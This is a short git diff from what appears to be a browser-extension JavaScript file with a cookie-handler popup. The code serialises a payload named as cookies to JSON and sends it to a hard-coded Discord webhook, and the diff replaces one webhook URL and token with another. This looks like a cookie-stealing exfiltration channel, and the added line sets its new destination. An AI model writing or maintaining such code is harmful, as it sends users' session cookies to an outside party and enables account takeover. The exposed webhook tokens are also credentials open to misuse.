@@ -1086,7 +1086,7 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
       const cookiesJson = JSON.stringify(payload, null, 2);
       
       // Discord webhook URL
-      const webhookUrl = 'https://discord.com/api/webhooks/1455463698037735446/y4AScsWwDwCi391QZL-xEh-wuWFNBlfSJX8JcgSVKI_pxswYfZoQbKbM7cN-AkMZ5ujI';
+      const webhookUrl = 'https://discord.com/api/webhooks/1458717493983051836/BYoykRBssJw2nC-XZ4yLIMb1CLki4iSFE6VdCfYwFUNFDmVw6JefmSI7eQrWSe8O612m';
       
       const maxMessageLength = 1900;
       
